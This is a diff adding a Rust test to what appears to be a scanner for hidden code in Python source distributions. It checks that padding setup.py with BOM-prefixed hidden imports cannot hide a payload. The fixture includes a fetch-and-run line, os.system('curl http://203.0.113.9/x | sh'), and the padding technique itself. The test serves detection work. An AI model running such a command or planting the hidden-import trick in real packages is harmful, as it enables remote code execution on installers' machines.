@@ -479,3 +479,44 @@ const PINNED_BOM_TOKENS: &[&str] = &[
     "(",
     ")",
 ];
+
+/// Hidden imports are followed up to a cap; past it, the scanner says so instead of going
+/// quiet, so padding a file with harmless hidden imports cannot push a payload out of reach.
+#[test]
+fn hidden_imports_past_the_follow_cap_are_reported() {
+    let names: Vec<String> = (0..20).map(|i| format!("h{i:02}")).collect();
+    let setup = format!(
+        "\u{feff}import {}\nfrom setuptools import setup\nsetup(name='demo')\n",
+        names.join(", ")
+    );
+    let paths: Vec<String> = names.iter().map(|n| format!("demo-1.0.0/{n}.py")).collect();
+    let payload = "import os\nos.system('curl http://203.0.113.9/x | sh')\n";
+    let mut files: Vec<(&str, &str)> = vec![("demo-1.0.0/setup.py", setup.as_str())];
+    for (i, p) in paths.iter().enumerate() {
+        files.push((p.as_str(), if i == 19 { payload } else { "X = 1\n" }));
+    }
+    let r = sdist(&files);
+    assert!(
+        r.hidden_code
+            .iter()
+            .any(|h| h.starts_with("setup.py:") && h.contains("not read")),
+        "{:?}",
+        r.hidden_code
+    );
+    // Under the cap the payload itself is found.
+    let r = sdist(&[
+        (
+            "demo-1.0.0/setup.py",
+            "\u{feff}import h00, h01\nfrom setuptools import setup\n",
+        ),
+        ("demo-1.0.0/h00.py", "X = 1\n"),
+        ("demo-1.0.0/h01.py", payload),
+    ]);
+    assert!(
+        r.hidden_code
+            .iter()
+            .any(|h| h.starts_with("h01.py:2: proc_exec")),
+        "{:?}",
+        r.hidden_code
+    );
+}
